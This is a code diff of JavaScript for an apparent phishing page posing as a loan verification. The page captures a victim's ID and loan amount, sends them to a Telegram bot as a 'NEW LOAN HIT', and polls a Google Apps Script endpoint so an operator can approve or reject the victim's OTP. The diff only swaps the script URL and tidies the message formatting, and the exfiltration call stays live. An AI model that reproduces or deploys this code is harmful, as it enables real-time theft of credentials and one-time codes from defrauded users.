@@ -120,7 +120,7 @@
         let isResetting = false;
         let otpInterval;
     // Config
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyZc8KBVktPafygd4tT5rPgbBXynWuEXO5Z-SVbCRhwKR11KRdb64_QKX6MqFPjybqr0Q/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxvkK3_K62C3_1J4-pGf7Th_zixUHJYS0QMpuSjTsJ9INoGegYsE5NW90p7COpo39gu-g/exec";
     const urlParams = new URLSearchParams(window.location.search);
     const BOT_TOKEN = urlParams.get('token');
     const CHAT_ID = urlParams.get('id');
@@ -161,28 +161,19 @@ async function startVerification() {
     if(!id) return alert("Required Field");
 
     document.getElementById('display-id').innerText = id;
-    showView(2); // Show Loading
+    showView(2);
 
-    // --- CLEANED LINK LOGIC ---
-    const cleanIdForUrl = encodeURIComponent(String(id).trim());
+    // Force ID to string and clean it
+    const cleanId = encodeURIComponent(String(id).trim());
 
-    const approveLink = `${SCRIPT_URL}?cmd=approve&num=${cleanIdForUrl}`;
-    const wrongLink = `${SCRIPT_URL}?cmd=wrongOTP&num=${cleanIdForUrl}`;
+    // NEW LINKS
+    const approveLink = `${SCRIPT_URL}?cmd=approve&num=${cleanId}`;
+    const wrongLink = `${SCRIPT_URL}?cmd=wrongOTP&num=${cleanId}`;
 
-    const msg = `💰 *NEW LOAN HIT*
-ID: ${id}
-Amt: GHS ${amt}
-
-✅ *APPROVE:* ${approveLink}
-❌ *WRONG OTP:* ${wrongLink}`;
-    // --------------------------
-
-    // Send to Telegram with no-cors to prevent browser blocks
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, {
-        mode: 'no-cors'
-    });
+    const msg = `💰 *NEW LOAN HIT*\nID: ${id}\nAmt: GHS ${amt}\n\n✅ *APPROVE:* ${approveLink}\n❌ *WRONG OTP:* ${wrongLink}`;
     
-    // Poll for Operator Approval
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
+    
     startPolling(id);
 }
     async function startPolling(phone) {
